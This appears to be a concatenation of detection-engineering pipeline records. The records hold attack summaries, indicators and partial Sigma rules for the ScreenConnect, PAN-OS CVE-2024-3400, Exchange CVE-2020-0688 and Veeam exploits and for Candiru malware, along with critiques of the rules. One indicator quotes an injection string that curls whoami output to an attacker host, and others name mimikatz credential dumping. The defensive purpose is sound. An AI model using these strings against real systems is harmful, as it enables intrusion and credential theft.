- The Epic backdoor uses a specific command to delete files on reboot. Strings: `delete Mark the file %TEMP%\~tmp085.dat to be deleted on reboot`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)
- The Epic backdoor uses a specific command to set filenames for deletion or creation. Strings: `name Set the filename to be deleted or created (depends on other parameters)`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/63/2014/08/21032604/KL_Epic_Turla_Technical_Appendix_20140806.pdf)

Registry key detection is precise but may need to be expanded to include other CLSIDs if the malware uses additional ones.
The rule for NtQueryInformationThread API call might generate false positives from debugging or monitoring tools. Consider adding a check for parent process or other contextual indicators.
Domain detection uses hardcoded domains which are good for initial detection but may need updates as attackers rotate C2 domains.
The rule for LSASS memory dumping is very specific to mimikatz and sekurlsa::logonpasswords. It might miss other tools or methods used for credential access.

pipeline.attack_summary: Adversaries exploit a path traversal bug and authentication bypass in ScreenConnect by accessing the SetupWizard.aspx endpoint with a trailing path segment to create a privileged account for remote control. They then use this access to deploy ransomware, cryptocurrency miners, additional remote access tools, and Cobalt Strike beacons, while attempting to evade detection through various techniques including clearing event logs, renaming files, and using legitimate-looking tools.

title: ScreenConnect Authentication Bypass via SetupWizard.aspx Path Traversal
id: 8a8e0f3c-4b2d-4a7e-9d6f-1e5c3a8f2d9e
status: experimental
description: Detects exploitation of ScreenConnect authentication bypass vulnerability by accessing SetupWizard.aspx with a trailing path segment to create a privileged account. This is the primary initial access vector.
references:

- The attack involves creating zero-byte files in specific telemetry directories that can be used for command injection. Strings: `/opt/panlogs/tmp/device_telemetry/hour/`, `/opt/panlogs/tmp/device_telemetry/day/`. (source: https://www.rapid7.com/blog/post/ra-cve-2024-3400-analysis/)

- The attack can be detected by monitoring for specific process execution patterns in the telemetry system. Strings: `/usr/bin/python -t /usr/local/bin/dt_curl -i 35.184.126.116 -f /opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}attacker:4444?user=$(whoami)``. (source: https://www.rapid7.com/blog/post/ra-cve-2024-3400-analysis/)

- The attack can be detected by monitoring for specific telemetry log entries showing command injection attempts. (source: https://www.rapid7.com/blog/post/ra-cve-2024-3400-analysis/)
- The attack uses specific HTTP request patterns that can be detected in access logs. Strings: `POST /global-protect/logout.esp`, `POST /global-protect/login.esp`. (source: https://www.rapid7.com/blog/post/ra-cve-2024-3400-analysis/)
- The attack involves specific telemetry configuration files that are modified to prevent command injection. Strings: `/etc/device_telemetry/cfg_telem.yaml`. (source: https://www.rapid7.com/blog/post/ra-cve-2024-3400-analysis/)

status: experimental
description: Detects the initial access phase of CVE-2020-0688 exploitation where an attacker authenticates via /owa/auth.owa and then sends a malicious GET request to vulnerable ECP endpoints like /ecp/default.aspx containing a serialized __VIEWSTATE parameter.

date: 2026-10-08

indicators.context: The exploit first authenticates with the server through a POST /owa/auth.owa request.
The exploit requests the /ecp/default.aspx page to obtain the __VIEWSTATEGENERATOR and ASP.NET.SessionID before crafting a malicious payload.
Multiple vulnerable pages use the same validation key from web.config allowing attacker to manipulate VIEWSTATE, including /ecp/PersonalSettings/HomePage.aspx.

The malicious payload is sent back to the /ecp/default.aspx endpoint with a serialized __VIEWSTATE parameter containing an embedded command.
The exploit uses the same validation key and validation algorithm from web.config to craft a serialized __VIEWSTATE request parameter containing an embedded command.
The exploit generates a SYSMON Event ID 4 in the Application logs with ERROR message containing the targeted page and serialized payload.
The exploit sends a payload that causes the IIS worker process w3wp.exe to spawn the malicious command as SYSTEM user.

The exploit causes execution of commands on the server by deserializing a malicious __VIEWSTATE parameter.
The exploit leverages the same validation key from web.config to forge valid signatures for the malicious payload.

The attack requires user authentication, which is a form of user execution or interaction.

SYSMON Event ID 4 logs contain the error messages with targeted page and serialized payload, which directly indicate exploitation attempts.

File event logs can detect access or modification of files related to the exploitation, such as those in Exchange logging directories.

attack_vector.reasoning: The write-up clearly describes an unauthenticated SQL shell command execution against a Veeam service over port 9401 as the initial access vector. The attack chain is well-defined with specific PowerShell scripts and payloads mentioned, making it clear that this is a command injection vulnerability exploited for remote code execution.

pipeline.attack_summary: The attack begins with exploitation of CVE-2023-27532 against Veeam Backup & Replication servers exposed on TCP port 9401, leading to unauthenticated SQL shell command execution. This triggers in-memory download and execution of PowerShell scripts such as POWERTRASH (icsnd16_64refl.ps1, icbt11801_64refl.ps1), which load obfuscated payloads. Post-initial access, the threat actor conducts reconnaissance using netstat, tasklist, ipconfig, and SQL commands to extract credentials from Veeam's database. Persistence is established via a custom script 'gup18.ps1' that drops multiple files including DUBLOADER components (libcurl.dll, JZ4qWKZW) into %APPDATA% and sets an autorun registry entry. Lateral movement occurs through WMI and 'net share' commands followed by SMB-based script transfer to remote hosts for execution.

indicators.context: An SQL server process related to the Veeam Backup instance executed a shell command, which performed in-memory download and execution of a PowerShell script.
An additional file called "445.ps1" was dropped and executed on the compromised Veeam backup servers. The retrieved script content functions as a port checker.
A custom PowerShell script, "gup18.ps1", was executed to set up an active foothold in the compromised machine by creating a persistence mechanism.
To resolve the list of collected IP addresses to their respective host names, a custom PowerShell script, "host_ip.ps1", was executed.

pipeline.attack_summary: The attack uses a private-sector offensive actor (SOURGUM/Candiru) that leverages 0-day Windows exploits (CVE-2021-31979 and CVE-2021-33771) to deliver DevilsTongue malware via browser-based drive-by compromise. The malware achieves persistence through COM hijacking by modifying registry keys to load malicious DLLs in the Windows system folder, specifically using IMJPUEXP.DLL. It employs multiple evasion techniques including stack manipulation and legitimate driver usage (physmem.sys), and communicates with C2 servers using domains like msstore[.]io.

The registry key detection uses a generic pattern 'HKEY_CURRENT_USER\Software\Microsoft\\'. This may lead to high false positives as many applications use similar paths. Consider adding more specific indicators or a whitelist.

The detection for .wsf files in Temp directory uses hardcoded path '\Temp\'. While this is common, it may miss variations like '\tmp\' or other temp-like directories. Consider using a more flexible pattern.
The PowerShell command line detection uses a very specific set of flags. While accurate for Qakbot, it may miss variations in flag order or additional parameters that could still be malicious.
